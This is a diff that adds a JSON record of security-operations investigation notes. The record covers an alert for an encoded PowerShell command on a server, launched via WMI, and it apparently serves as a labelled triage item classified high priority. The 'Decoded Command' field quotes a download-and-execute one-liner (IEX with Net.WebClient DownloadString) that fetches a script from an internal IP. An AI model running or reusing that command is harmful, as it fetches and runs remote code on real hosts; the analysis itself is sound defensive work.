@@ -1,0 +1,18 @@
+{
+  "investigation_notes": {
+    "Alert ID": "SOC-10004",
+    "Start Time": "2026-01-27T13:45:10.000Z",
+    "Alert Name": "Suspicious PowerShell Script Execution",
+    "Source IP": "10.50.11.92",
+    "Endpoint": "SRV-APPS-02",
+    "User": "s_keller",
+    "Initiating Process": "powershell.exe",
+    "Process SHA256": "9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3",
+    "Parent Process": "wmiprvse.exe",
+    "Decoded Command": "Encoded PowerShell one-liner that uses IEX to download and execute a script (iex (New-Object Net.WebClient).DownloadString('http://172.16.8.92/PowerSPread.ps1') ...).",
+    "Download URL": "http://172.16.8.92/PowerSPread.ps1",
+    "Process Reputation Summary": "VirusTotal: 0 engines flagged this PowerShell binary as malicious; community score -24 with 29 votes marking malicious vs 20 harmless.",
+    "Description": "A Base64-encoded PowerShell command was executed on SRV-APPS-02 by user s_keller that decodes to an IEX call downloading and invoking a script from http://172.16.8.92/PowerSPread.ps1. The command was launched by powershell.exe with a parent process of wmiprvse.exe, indicating potential remote or lateral execution. The executable hash has no AV detections but community feedback leans malicious, and the use of encoded download-and-execute combined with WMI-based initiation increases the likelihood of unauthorized activity. This activity is classified as High Priority because it represents potential remote code execution on a server and warrants further investigation and containment."
+  },
+  "classification": "HP"
+}
